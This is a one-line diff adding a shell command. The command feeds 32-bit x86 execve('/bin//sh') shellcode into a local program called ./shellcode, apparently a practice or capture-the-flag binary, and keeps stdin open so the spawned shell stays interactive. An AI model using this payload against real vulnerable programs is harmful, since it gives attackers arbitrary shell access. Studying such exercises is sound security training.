@@ -1,0 +1,1 @@
+{ sleep 1; echo -e "1\xc91\xd2Qhn/shh//bi\x89\xe31\xc0\xb0\x0b\xcd\x80\xeb\xfe"; sleep 1; cat; } | ./shellcode
